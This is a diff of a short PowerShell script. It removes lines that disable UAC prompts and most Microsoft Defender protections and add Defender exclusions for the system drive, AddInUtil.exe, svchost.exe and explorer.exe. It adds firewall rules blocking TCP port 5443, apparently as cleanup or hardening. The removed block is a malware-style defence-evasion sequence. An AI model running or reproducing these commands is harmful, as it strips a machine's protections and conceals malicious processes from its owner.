@@ -1,16 +1,4 @@
-Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0;
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;
-Add-MpPreference -ExclusionPath $env:SYSTEMDRIVE\;
-Add-MpPreference -ExclusionProcess "AddInUtil.exe";
-Add-MpPreference -ExclusionProcess "svchost.exe";
-Add-MpPreference -ExclusionProcess "explorer.exe";
-Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 5;
-Stop-Process -Name "AddInUtil" -Force
-
-ping google.com
-
-"$env:USERNAME" | Out-File -FilePath (Join-Path $env:USERPROFILE "$env:USERPROFILE.txt")
-
+if (-not (Get-NetFirewallRule | Where-Object { $_.DisplayName -eq "Block Port 5443 Inbound" -and $_.Enabled -eq "True" })) { New-NetFirewallRule -DisplayName "Block Port 5443 Inbound" -Direction Inbound -Action Block -Protocol TCP -LocalPort 5443 }; if (-not (Get-NetFirewallRule | Where-Object { $_.DisplayName -eq "Block Port 5443 Outbound" -and $_.Enabled -eq "True" })) { New-NetFirewallRule -DisplayName "Block Port 5443 Outbound" -Direction Outbound -Action Block -Protocol TCP -LocalPort 5443 }
 
 
 $env:USERNAME
